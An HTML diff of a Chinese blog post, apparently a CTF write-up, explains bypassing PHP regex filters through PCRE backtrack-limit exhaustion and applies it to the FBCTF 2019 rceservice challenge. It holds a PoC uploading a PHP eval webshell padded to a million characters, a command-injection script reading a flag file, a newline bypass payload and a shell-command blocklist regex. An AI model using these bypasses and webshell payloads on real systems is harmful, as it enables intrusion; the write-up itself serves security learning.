@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/piiick.jpg">
+  <link rel="icon" href="/images/piiick.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="piiick">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="参考p神博客：PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com) 参考p神的代码进行分析 12345678&lt;?phpfunction is_php($data)&#123;      return preg_match(&#x27;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#x27;, $data);  &#125;if(!is_php($i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP利用pcre回溯次数限制的绕过waf">
+<meta property="og:url" content="http://example.com/2024/07/19/PHP%E5%88%A9%E7%94%A8prce%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="piiick的博客">
+<meta property="og:description" content="参考p神博客：PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com) 参考p神的代码进行分析 12345678&lt;?phpfunction is_php($data)&#123;      return preg_match(&#x27;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#x27;, $data);  &#125;if(!is_php($i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/pcre/1.png">
+<meta property="og:image" content="http://example.com/images/pcre/2.png">
+<meta property="og:image" content="http://example.com/images/pcre/3.png">
+<meta property="og:image" content="http://example.com/images/pcre/4.png">
+<meta property="og:image" content="http://example.com/images/pcre/5.png">
+<meta property="og:image" content="http://example.com/images/pcre/6.png">
+<meta property="og:image" content="http://example.com/images/pcre/7.png">
+<meta property="og:image" content="http://example.com/images/pcre/8.png">
+<meta property="og:image" content="http://example.com/images/pcre/9.png">
+<meta property="og:image" content="http://example.com/images/pcre/10.png">
+<meta property="og:image" content="http://example.com/images/pcre/11.png">
+<meta property="og:image" content="http://example.com/images/pcre/12.png">
+<meta property="og:image" content="http://example.com/images/pcre/13.png">
+<meta property="og:image" content="http://example.com/images/pcre/14.png">
+<meta property="og:image" content="http://example.com/images/pcre/15.png">
+<meta property="og:image" content="http://example.com/images/pcre/16.png">
+<meta property="og:image" content="http://example.com/images/pcre/19.png">
+<meta property="og:image" content="http://example.com/images/pcre/17.png">
+<meta property="og:image" content="http://example.com/images/pcre/18.png">
+<meta property="article:published_time" content="2024-07-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-20T09:46:22.168Z">
+<meta property="article:author" content="piiick">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/pcre/1.png">
+  
+  
+  
+  <title>PHP利用pcre回溯次数限制的绕过waf - piiick的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/cur.css">
+<link rel="stylesheet" href="/css/welt_right.css">
+<link rel="stylesheet" href="/css/toutudaziji.css">
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/images/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>piiick的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/none.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PHP利用pcre回溯次数限制的绕过waf"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-19 00:00" pubdate>
+          2024年7月19日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+<script>
+  function getRandomNumber(min, max) {
+  min = Math.ceil(min);
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+var randomNum = getRandomNumber(1, 17).toString();
+var banner_img = "/images/random-bg/" + randomNum + ".jpg";
+document.getElementById('banner').removeAttribute('style')
+document.getElementById('banner').setAttribute('style',`background: url('${banner_img}') no-repeat center center; background-size: cover;`)
+
+
+</script>
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PHP利用pcre回溯次数限制的绕过waf</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>参考p神博客：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</a></p>
+<p>参考p神的代码进行分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>     <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$f</span>, <span class="hljs-variable">$input</span>); ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对输入内容进行判断，查看是否有被过滤的内容，如果没有则写入文件。</p>
+<p>过滤内容大致是不允许写php代码</p>
+<p>对此题如何绕过is_php()来写入进项php代码研究</p>
+<h3 id="对正则表达式的深入理解"><a href="#对正则表达式的深入理解" class="headerlink" title="对正则表达式的深入理解"></a>对正则表达式的深入理解</h3><p>常见的正则引擎分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）</p>
+<ul>
+<li><p><strong>DFA:</strong> 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p>
+</li>
+<li><p><strong>NFA：</strong>从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p>
+</li>
+</ul>
+<p>NFA执行存在回溯，性能会比DFA差，但是NFA支持的功能更多。</p>
+<p>PHP的PCRE库中就使用了NFA作为正则引擎，所以会存在回溯</p>
+<hr>
+<h4 id="回溯过程："><a href="#回溯过程：" class="headerlink" title="回溯过程："></a>回溯过程：</h4><p>利用在线工具对正则回溯进行分析:<a target="_blank" rel="noopener" href="https://hiregex.com/">嗨正则-正则表达式在线测试与调试工具</a></p>
+<p>正则表达式为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.*[(`;<span class="hljs-meta">?&gt;</span>].*<br></code></pre></td></tr></table></figure>
+
+<p>测试文本为：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php phpinfo();//aaaaa<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/pcre/1.png" srcset="/images/loading.gif" lazyload></p>
+<p>点击正则执行步骤</p>
+<p><img src="/images/pcre/2.png" srcset="/images/loading.gif" lazyload></p>
+<p>我们可以看到最终匹配结果为</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt; 匹配 &lt;<br>\? 匹配 ?<br>.* 匹配 php phpinfo()<br>[(`;?&gt;] 匹配 ;<br>.* 匹配 //aaaaa<br></code></pre></td></tr></table></figure>
+
+<p>可以查看每一步匹配的字符</p>
+<p><strong>step1:</strong></p>
+<p><img src="/images/pcre/3.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step2:</strong></p>
+<p><img src="/images/pcre/4.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step3:</strong></p>
+<p><img src="/images/pcre/5.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step4:</strong></p>
+<p><img src="/images/pcre/6.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step5:</strong></p>
+<p><img src="/images/pcre/7.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step6:</strong></p>
+<p><img src="/images/pcre/8.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step7:</strong></p>
+<p><img src="/images/pcre/9.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step8:</strong></p>
+<p><img src="/images/pcre/10.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step9:</strong></p>
+<p><img src="/images/pcre/11.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step10:</strong></p>
+<p><img src="/images/pcre/12.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step11:</strong></p>
+<p><img src="/images/pcre/13.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step12:</strong></p>
+<p><img src="/images/pcre/14.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step13:</strong></p>
+<p><img src="/images/pcre/15.png" srcset="/images/loading.gif" lazyload></p>
+<p><strong>step14:</strong></p>
+<p><img src="/images/pcre/16.png" srcset="/images/loading.gif" lazyload></p>
+<p>我们可以发现在step3的时候.*匹配了后面全部字符串，这显然不对</p>
+<p>因为后面的 [(&#96;;?&gt;] 还没有匹配</p>
+<p>所以在step5处开始回溯</p>
+<p>依次吐出一个字符</p>
+<p>直到 [(&#96;;?&gt;] 匹配到 ; 回溯结束</p>
+<p>.*匹配剩下的字符串，匹配成功</p>
+<p>显示红色的表示回溯，一共回溯了8次</p>
+<hr>
+<h3 id="对PHP的pcre-backtrack-limit限制利用"><a href="#对PHP的pcre-backtrack-limit限制利用" class="headerlink" title="对PHP的pcre.backtrack_limit限制利用"></a>对PHP的pcre.backtrack_limit限制利用</h3><p>因为回溯会降低服务的性能，大量的回溯则会产生reDOS</p>
+<p>所以php为了防止正则表达式的拒绝服务攻击(reDOS)</p>
+<p>给pcre设定了回溯次数上限 pcre.backtrack_limit</p>
+<p>可以通过 var_dump(ini_get(‘pcre.backtrack_limit’));</p>
+<p>来查看当前环境对回溯次数的限制</p>
+<p>参考英文版的PHP文档</p>
+<p>默认回溯次数为100万，如果回溯次数超过100万那么preg_match会返回false</p>
+<p>意思就是匹配失败，意味着我们就可以通过发超长字符串，使得正则匹配失败绕过PHP语言限制</p>
+<hr>
+<p><strong>POC</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="CTF实战：-FBCTF-2019-rceservice-NSSCTF"><a href="#CTF实战：-FBCTF-2019-rceservice-NSSCTF" class="headerlink" title="CTF实战：[FBCTF 2019]rceservice | NSSCTF"></a>CTF实战：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1190">FBCTF 2019]rceservice | NSSCTF</a></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Web Adminstration Interface&lt;/h1&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 将环境变量 &#x27;PATH&#x27; 设置为 &#x27;/home/rceservice/jail&#x27;</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-comment">// 检查请求中是否存在 &#x27;cmd&#x27; 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-comment">// 检查 &#x27;cmd&#x27; 参数是否是字符串</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;检测到黑客攻击&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <br>    <span class="hljs-comment">// 使用正则表达式匹配潜在的危险命令</span><br>    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;检测到黑客攻击&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 尝试运行命令</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;尝试运行命令:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-comment">// 将 JSON 字符串解码为 PHP 数组</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// 使用 system() 函数执行命令</span><br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;无效输入&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>    &lt;form&gt;<br>      Enter command <span class="hljs-keyword">as</span> JSON:<br>      &lt;input name=<span class="hljs-string">&quot;cmd&quot;</span> /&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>可以看到过滤了很多东西</p>
+<p>要求JSON命令来输入，就是键值对的方法</p>
+<hr>
+<p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code></p>
+<p>将环境变量<code>PATH</code>设置为<code>/home/rceservice/jail</code></p>
+<p>这意味着任何命令的执行都将仅限于此路径下的可执行文件。</p>
+<p>在这种情况下，除非<code>/home/rceservice/jail</code>目录中存在<code>cat</code>命令，否则默认路径下的<code>cat</code>命令将不可用。</p>
+<p>通常情况下，<code>cat</code>命令在系统的<code>/bin</code>目录中，这意味着你需要指定完整路径<code>/bin/cat</code>才能执行<code>cat</code>命令。</p>
+<hr>
+<p>推测flag在&#x2F;home&#x2F;rceservice&#x2F;目录下</p>
+<p>可以用脚本验证</p>
+<p><img src="/images/pcre/19.png" srcset="/images/loading.gif" lazyload></p>
+<p>直接拿脚本跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-keyword">import</span> requests<br> <br> payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br> res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28528/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-comment">#print(payload)</span><br> <span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/pcre/17.png" srcset="/images/loading.gif" lazyload></p>
+<hr>
+<p><strong>其他解法:</strong></p>
+<p>当看到正则中存在^xxx$格式也会用%0a：%0a绕过</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">payload:?cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/pcre/18.png" srcset="/images/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/php/" class="category-chain-item">php</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PHP利用pcre回溯次数限制的绕过waf</div>
+      <div>http://example.com/2024/07/19/PHP利用prce回溯次数限制的绕过/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>piiick</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B9%98%E8%B5%A3%E8%BE%B9%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="武功山杯·第一届湘赣边大学生网络安全竞赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">武功山杯·第一届湘赣边大学生网络安全竞赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/13/SSTI%E8%87%AA%E5%8A%A8%E5%B7%A5%E5%85%B7/" title="SSTI工具">
+                        <span class="hidden-mobile">SSTI工具</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="#" target="_blank" rel="nofollow noopener"><span>piiick</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>fluid</span></a> <br><span id="timeDate">天数载入中</span><span id="times">...</span><br> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
